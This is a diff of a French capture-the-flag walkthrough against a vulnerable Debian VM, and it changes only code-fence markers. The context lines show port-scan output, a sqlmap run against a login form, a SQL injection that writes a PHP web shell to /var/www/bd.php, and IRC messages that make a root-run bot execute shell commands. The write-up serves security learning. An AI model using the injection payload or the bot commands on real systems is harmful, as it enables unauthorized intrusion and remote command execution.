@@ -17,7 +17,7 @@ Smells like bot spirit
 
 On ne trouve seulement quelques ports ouverts sur cette Debian 6 virtualisée :  
 
-```plain
+```
 Not shown: 65531 closed ports
 PORT     STATE SERVICE VERSION
 22/tcp   open  ssh     OpenSSH 5.5p1 Debian 6+squeeze3 (protocol 2.0)
@@ -49,7 +49,7 @@ PORT     STATE SERVICE VERSION
 
 Sur le port 6667 on trouve un serveur IRC (ircd-irc2) avec l'invite suivante :  
 
-```plain
+```
 * There are 2 users and 0 services on 1 servers
 * 16 :channels formed
 * I have 2 users, 0 services and 0 servers
@@ -73,7 +73,7 @@ python sqlmap.py -u http://192.168.1.53/index.php?page=login --data="user=test&p
 
 J'obtiens en vrac les informations suivantes (en changeant le dernier paramètre) :  
 
-```plain
+```
 web server operating system: Linux Debian 6.0 (squeeze)
 web application technology: PHP 5.3.3, Apache 2.2.16
 back-end DBMS: MySQL >= 5.0.0
@@ -146,7 +146,7 @@ Je suis donc revenu sur le SQL et en exploitant un *INTO OUTFILE* ça a fonction
 
 Pour cela j'ai simplement saisi comme nom d'utilisateur :  
 
-```plain
+```
 ' union select '<?php system($_GET["cmd"]); ?>', '' into outfile '/var/www/bd.php'#
 ```
 
@@ -169,7 +169,7 @@ Linux IRCC2 2.6.32-5-686 #1 SMP Fri May 10 08:33:48 UTC 2013 i686 GNU/Linux
 
 Dans les processus je remarque cette ligne :  
 
-```plain
+```
 root      1537  0.0  1.2  28748  6360 ?        S    May29   0:00 php /root/decoded.php
 ```
 
@@ -218,7 +218,7 @@ if($line[5]){
 
 Ainsi si un bot baptisé *abcd* reçoit le message suivant de la part d'un utilisateur *root* :  
 
-```plain
+```
 :root!~root@192.168.1.3 PRIVMSG abcd :!cmd @system 'id'
 ```
 
@@ -235,7 +235,7 @@ $arg = 'id'
 
 et pour ce message :  
 
-```plain
+```
 :root!~root@192.168.1.3 PRIVMSG abcd :!bot @system 'id'
 ```
 
@@ -290,13 +290,13 @@ En me basant [sur la liste des commandes IRC](http://en.wikipedia.org/wiki/List_
 
 L'astuce a été de tenter d'envoyer un message pour chaque l'utilisateur (heureusement il n'y en a que 30) avec par exemple :  
 
-```plain
+```
 /privmsg jhl8 test
 ```
 
 Ce qui donne pour un utilisateur inexistant (selon votre client IRC) :  
 
-```plain
+```
 [13:20] [Erreur] jhl8 : aucun pseudo / canal de ce type.
 ```
 
@@ -312,13 +312,13 @@ killall tshd
 
 J'ai procédé de la sorte car j'ai remarqué que le bot digère mal les arguments (exemple avec *uname -a*) :  
 
-```plain
+```
 sh: uname -a : commande introuvable
 ```
 
 Il ne me restait qu'à faire lancer mon script par le bot :  
 
-```plain
+```
 /msg jhl27 !bot @system '/dev/shm/replace.sh'
 ```
 
